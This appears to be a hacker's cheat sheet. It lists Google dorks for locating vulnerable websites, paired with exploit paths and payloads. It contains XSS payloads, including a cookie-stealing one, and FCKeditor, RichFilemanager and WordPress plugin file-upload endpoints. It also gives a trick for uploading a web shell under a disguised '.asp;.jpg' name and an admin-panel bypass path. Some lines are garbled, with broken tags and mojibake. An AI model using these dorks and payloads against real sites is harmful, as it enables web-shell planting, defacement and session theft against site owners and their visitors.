# XSS 

inurl:"/showcatrows.php?CategoryID="

exploit : 

"><marquee><h1>Your text</h1></mmarque>

<script>alert("XSS")</script>

"/><script>alert("XSS")</script>

""/><script>alert("XSS")</script>

"><script>alert("XSS")</script>

<sCript>alert("XSS")</sCript>

()&%<acx><ScRiPt >alert("XSS")</ScRiPt>

"><script>alert(document.cookie)</script>

# Fckeditor

inurl:"frame=product_detail"

exploit :

target.com/jscripts/FCKeditor/editor/filemanager/upload/test.html

target.com/fckeditor/editor/filemanager/browser/default/connectors/test.html

intext:dokumenary.net

Exploit : /assets/comp/RichFilemanager/scripts/jQuery-File-Upload/

# WordPress

inurl:''/wp-content/plugins/fckeditor-for-wordpress-plugin/''

+ intext:''DESIGN BY PURR.''

+ intext:''powered by WordPress. InBiz theme made it free by desain web.
Hosting by rozhled.cz''

+ intext:''Site entraA(r)nA(c) par WordPress | Connexion | Flux (RSS) des
articles | ThA"me Arthemia de Michael Jubel | Stats''

+ intext:''designed by Portland Web Design''

+ intext:''A(c) 2009 websitemagix.com powered by fotomagix''

+ intext:''powered by fotomagix''

+ intext:''realizace webu: Pavel Gloss''

+ intext:''A(c) 2008 - 2018 Heather Richards Live | All Rights Reserved.''

+ intext:''Powered by WordPress ( WordPress Deutschland ) - Handcoded by

 Exploit :

/wp-content/plugins/fckeditor-for-wordpress-plugin/filemanager/connectors/uploadtest.html

/wp-content/plugins/fckeditor-for-wordpress-plugin/filemanager/connectors/test.html

/wp-content/plugins/fckeditor-for-wordpress-plugin/fckeditor/editor/filemanager/browser/default/frmupload.html

/wp-content/plugins/fckeditor-for-wordpress-plugin/fckeditor/editor/filemanager/browser/default/browser.html

# Directory File Path :

/wp-content/uploads/.....

/wp-content/uploads/[YEAR]/[MONTH]/......

Select PHP extension and then Try to upload as .asp;.jpg filename
shell extension.

#Bypass-admin

Dork : "restaurants_details.php?id=" |

Exploit : /admin/dashboard.php

